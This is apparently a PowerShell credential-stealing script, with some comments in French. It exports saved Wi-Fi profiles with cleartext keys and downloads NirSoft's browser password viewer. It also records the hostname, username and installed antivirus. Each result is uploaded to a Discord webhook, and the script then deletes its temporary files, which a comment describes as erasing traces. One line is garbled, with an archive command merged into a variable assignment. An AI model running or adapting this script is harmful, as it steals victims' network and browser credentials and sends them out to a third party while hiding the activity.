$desktop = ([Environment]::GetFolderPath("Desktop"))
function Get-Nirsoft {

  mkdir \temp 
  cd \temp
  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
  .\7z\7za.exe e wbpv.zip

}

function Info1 {
cd C:\
mkdir \temp
cd \temp
# Get the date at the selected format
$date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"

# Get computer name and user name
$namepc = $env:computername
$user = $env:UserName

# Creates the file with the format i want
$Info1content = "Nom du pc : $namepc`r`nUser : $user`r`nDate : $date"

# Writes the output of $Info1content to "Info1content.txt"
$Info1content | Out-File -FilePath "C:\Temp\Info1content.txt" -Encoding utf8

#Upload to Discord via the Upload-Discord function
Upload-Discord -file "C:\temp\Info1content.txt" -text "Hostname, Username, Date :"

#Efface les traces et supprime le dossier temporaire créé
rmdir -R \temp
}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)



$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
}

function Wifi {
New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
Set-Location -Path "$env:temp"
Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
}

 function Del-Nirsoft-File {
  cd C:\
  rmdir -R \temp
}

function version-av {
  mkdir \temp 
  cd \temp
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
  Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
  cd C:\
  rmdir -R \temp
}

